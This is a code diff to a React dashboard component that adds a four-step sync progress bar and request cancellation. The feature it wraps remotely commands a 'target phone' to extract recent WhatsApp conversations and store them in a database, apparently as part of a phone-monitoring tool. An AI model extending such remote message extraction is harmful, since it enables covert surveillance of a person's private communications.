@@ -236,6 +236,16 @@ export function isContactSyncPlaceholder(text: string | null | undefined): boole
   return false;
 }
 
+export interface SyncProgress {
+  chatName: string;
+  step: 1 | 2 | 3 | 4;
+  percent: number;
+  title: string;
+  detail: string;
+  status: "idle" | "running" | "success" | "empty" | "error";
+  startedAt?: Date;
+}
+
 export function isPhoneNumberString(text: string | null | undefined): boolean {
   if (!text) return false;
   const t = text.trim();
@@ -314,6 +324,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
   // Mobile app chat request state & 2-min auto-sync
   const [requestingChat, setRequestingChat] = useState<string | null>(null);
+  const [syncProgress, setSyncProgress] = useState<SyncProgress | null>(null);
+  const activeRequestIdRef = useRef<number>(0);
+  const selectedChatIdRef = useRef<string | null>(selectedChatId);
+  selectedChatIdRef.current = selectedChatId;
   const [autoSyncEnabled, setAutoSyncEnabled] = useState(true);
   const [countdownSeconds, setCountdownSeconds] = useState(120);
   const [lastSyncTime, setLastSyncTime] = useState<Date | null>(null);
@@ -638,15 +652,24 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const requestChatFromMobileApp = async (chatName: string, _isAutoSync = false) => {
     if (!chatName || !chatName.trim()) return;
     const cleanName = chatName.trim();
-    if (requestingChat) return; // Prevent concurrent requests
+
+    // Increment request ID so any previously running command poll aborts immediately
+    const myRequestId = ++activeRequestIdRef.current;
 
     setRequestingChat(cleanName);
     setCountdownSeconds(120); // Reset 2-min countdown timer
 
-    try {
-      // NOTE: Do NOT delete existing conversation messages from DB!
-      // They stay continuously visible, and newly arrived messages patch seamlessly.
+    setSyncProgress({
+      chatName: cleanName,
+      step: 1,
+      percent: 25,
+      title: "1. Request Sent",
+      detail: `Step 1/4: 📤 Dispatching fetch command for "${cleanName}" to target phone...`,
+      status: "running",
+      startedAt: new Date(),
+    });
 
+    try {
       const matchedChat = whatsappChats.find(
         (c) => c.chat_name?.trim().toLowerCase() === cleanName.toLowerCase()
       );
@@ -659,54 +682,149 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         days: 2,
       });
 
+      if (activeRequestIdRef.current !== myRequestId) return; // User switched to another chat
+
       const cmdId = cmd?.id;
       let finished = false;
 
       if (cmdId) {
-        // Poll command status from server (12 iterations x 1.5s = 18 seconds window)
-        for (let i = 0; i < 12; i++) {
+        // Poll command status from server (16 iterations x 1.5s = 24s window)
+        for (let i = 0; i < 16; i++) {
           await new Promise((r) => setTimeout(r, 1500));
+          if (activeRequestIdRef.current !== myRequestId) return; // Abort if user switched chat
+
           try {
             const checked = await devicesApi.getCommand(deviceId, cmdId);
+            if (activeRequestIdRef.current !== myRequestId) return; // Abort if user switched chat
 
-            if (checked.status === "acked") {
+            if (checked.status === "sent") {
+              setSyncProgress((prev) =>
+                prev?.chatName === cleanName
+                  ? {
+                      ...prev,
+                      step: 2,
+                      percent: 50,
+                      title: "2. Mobile Phone Received",
+                      detail: `Step 2/4: 📱 Target phone received command and is extracting conversation...`,
+                      status: "running",
+                    }
+                  : prev
+              );
+            } else if (checked.status === "acked") {
               finished = true;
               setLastSyncTime(new Date());
+
+              const respMsg = (checked.result as any)?.message || "Conversation messages synced by phone.";
+              setSyncProgress((prev) =>
+                prev?.chatName === cleanName
+                  ? {
+                      ...prev,
+                      step: 3,
+                      percent: 75,
+                      title: "3. Phone Response Received",
+                      detail: `Step 3/4: 💬 ${respMsg} Storing into database...`,
+                      status: "running",
+                    }
+                  : prev
+              );
 
               // Seamlessly patch newly arrived messages without reloading the whole screen
               if (fetchCurrentChatRef.current) {
                 fetchCurrentChatRef.current(false);
               }
               loadRef.current();
+
+              // Verify message count after fetch
+              setTimeout(() => {
+                if (activeRequestIdRef.current === myRequestId) {
+                  devicesApi.whatsAppMessages(deviceId, cleanName).then((msgs) => {
+                    if (activeRequestIdRef.current !== myRequestId) return;
+                    if (msgs && msgs.length > 0) {
+                      setSyncProgress({
+                        chatName: cleanName,
+                        step: 4,
+                        percent: 100,
+                        title: "4. DB & Dashboard Updated",
+                        detail: `Step 4/4: 💾 Ready! ${msgs.length} messages loaded from DB and displayed.`,
+                        status: "success",
+                      });
+                    } else {
+                      setSyncProgress({
+                        chatName: cleanName,
+                        step: 4,
+                        percent: 100,
+                        title: "4. Phone Checked (0 Messages)",
+                        detail: (checked.result as any)?.message || "Phone reported 0 messages found in last 2 days.",
+                        status: "empty",
+                      });
+                    }
+                  }).catch(() => {});
+                }
+              }, 600);
+
               break;
             } else if (checked.status === "failed") {
               finished = true;
+              setSyncProgress({
+                chatName: cleanName,
+                step: 4,
+                percent: 100,
+                title: "4. Phone Response",
+                detail: (checked.result as any)?.message || "Device reported: No conversation found in last 2 days.",
+                status: "empty",
+              });
               break;
             }
           } catch (_) {}
         }
       }
 
-      if (!finished) {
+      if (!finished && activeRequestIdRef.current === myRequestId) {
         setLastSyncTime(new Date());
         if (fetchCurrentChatRef.current) {
           fetchCurrentChatRef.current(false);
         }
+        setSyncProgress({
+          chatName: cleanName,
+          step: 4,
+          percent: 100,
+          title: "4. DB Synced",
+          detail: "Sync window completed. Stored messages refreshed from DB.",
+          status: "idle",
+        });
       }
     } catch (err: any) {
       console.warn("Failed to dispatch get_whatsapp_chat command:", err);
-    } finally {
-      setRequestingChat(null);
-      if (fetchCurrentChatRef.current) {
-        fetchCurrentChatRef.current(false);
+      if (activeRequestIdRef.current === myRequestId) {
+        setSyncProgress({
+          chatName: cleanName,
+          step: 4,
+          percent: 100,
+          title: "Sync Error",
+          detail: "Failed to dispatch request to phone.",
+          status: "error",
+        });
       }
-      loadRef.current();
+    } finally {
+      if (activeRequestIdRef.current === myRequestId) {
+        setRequestingChat(null);
+        if (fetchCurrentChatRef.current) {
+          fetchCurrentChatRef.current(false);
+        }
+        loadRef.current();
+      }
     }
   };
 
   const handleSelectChat = (c: UnifiedChatSummary) => {
     if (selectedChatId !== c.id) {
+      // 1. Cancel any active command polling for previous chat
+      activeRequestIdRef.current++;
+
+      // 2. Switch selected chat immediately
       setSelectedChatId(c.id);
+
+      // 3. Clear existing active thread or set preview
       if (c.lastMessage && !c.isContactOnly && !isContactSyncPlaceholder(c.lastMessage)) {
         const rawText = c.lastMessage;
         const isTargetSent = Boolean(c.lastIsOutgoing) || rawText.startsWith("You: ") || rawText.startsWith("You reacted ");
@@ -723,7 +841,13 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       } else {
         setActiveThreadMessages([]);
       }
+
       setCountdownSeconds(120);
+
+      // 4. Dispatch fetch request for this newly clicked chat
+      requestChatFromMobileApp(c.chatName, false);
+    } else {
+      // User clicked already active chat to force re-sync
       requestChatFromMobileApp(c.chatName, false);
     }
   };
@@ -757,6 +881,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         .whatsAppMessages(deviceId, currentChatName)
         .then((msgs: WhatsAppMessage[]) => {
           if (!isMounted) return;
+          if (selectedChatIdRef.current !== currentChatName) return;
           console.log("===WHATSAPP_MSGS_FOR_CHAT===", currentChatName, msgs);
 
           // Do NOT drop messages using client-side strict date filters!
@@ -1982,9 +2107,90 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                         </div>
                       </div>
 
+                      {/* Mini 4-Step Chat Sync Progress Bar */}
+                      {syncProgress && (
+                        <div
+                          id="chat-sync-progress-bar"
+                          className="px-3.5 py-2.5 bg-gradient-to-r from-slate-900 via-slate-850 to-slate-900 border-b border-slate-700/80 text-white shadow-md transition-all duration-300"
+                        >
+                          <div className="flex items-center justify-between gap-2 mb-1.5">
+                            <div className="flex items-center gap-2 min-w-0">
+                              <span className="flex h-2 w-2 relative">
+                                {syncProgress.status === "running" ? (
+                                  <>
+                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                                  </>
+                                ) : syncProgress.status === "error" ? (
+                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-rose-500"></span>
+                                ) : syncProgress.status === "empty" ? (
+                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-amber-500"></span>
+                                ) : (
+                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-teal-400"></span>
+                                )}
+                              </span>
+                              <span className="text-[11px] font-semibold text-slate-200 truncate">
+                                Syncing: <span className="text-emerald-400 font-bold">{syncProgress.chatName}</span>
+                              </span>
+                            </div>
+                            <div className="flex items-center gap-2 shrink-0">
+                              <span className="text-[10px] font-mono font-bold text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 px-1.5 py-0.5 rounded">
+                                {syncProgress.percent}%
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setSyncProgress(null)}
+                                className="text-slate-400 hover:text-slate-200 text-xs px-1 hover:bg-slate-800 rounded transition"
+                                title="Dismiss progress bar"
+                              >
+                                ✕
+                              </button>
+                            </div>
+                          </div>
 
+                          {/* 4-Step Visual Milestones */}
+                          <div className="grid grid-cols-4 gap-1 mb-1.5 text-[9px] font-medium">
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 1 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                              <span>📤</span>
+                              <span className="truncate">1. Request</span>
+                            </div>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 2 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                              <span>📱</span>
+                              <span className="truncate">2. Phone Rx</span>
+                            </div>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 3 ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" : "bg-slate-800/60 text-slate-500"}`}>
+                              <span>💬</span>
+                              <span className="truncate">3. Response</span>
+                            </div>
+                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 4 ? (syncProgress.status === "error" ? "bg-rose-500/20 text-rose-300 border border-rose-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
+                              <span>💾</span>
+                              <span className="truncate">4. DB Ready</span>
+                            </div>
+                          </div>
 
-                      {/* 2-Day Real Activity & User Login Time Banner */}
+                          {/* Progress Line */}
+                          <div className="w-full bg-slate-800 rounded-full h-1.5 overflow-hidden">
+                            <div
+                              className={`h-full transition-all duration-500 ease-out ${
+                                syncProgress.status === "error"
+                                  ? "bg-rose-500"
+                                  : syncProgress.percent === 100
+                                  ? "bg-gradient-to-r from-emerald-500 via-teal-400 to-emerald-400"
+                                  : "bg-gradient-to-r from-blue-500 via-teal-400 to-emerald-400 animate-pulse"
+                              }`}
+                              style={{ width: `${syncProgress.percent}%` }}
+                            />
+                          </div>
+
+                          {/* Detail Status text */}
+                          <div className="mt-1 flex items-center justify-between text-[10px] text-slate-400 font-mono">
+                            <span className="truncate">{syncProgress.detail}</span>
+                            {syncProgress.status === "running" && (
+                              <span className="text-[10px] text-emerald-400 animate-pulse shrink-0 ml-2">Live Sync...</span>
+                            )}
+                          </div>
+                        </div>
+                      )}
                       <div className="px-3.5 py-2 bg-gradient-to-r from-emerald-50 via-teal-50/70 to-emerald-50 border-b border-emerald-100 flex flex-wrap items-center justify-between gap-2 text-xs text-emerald-950 shrink-0 shadow-2xs">
                         <div className="flex items-center gap-2 min-w-0">
                           <span className="text-sm">📅</span>
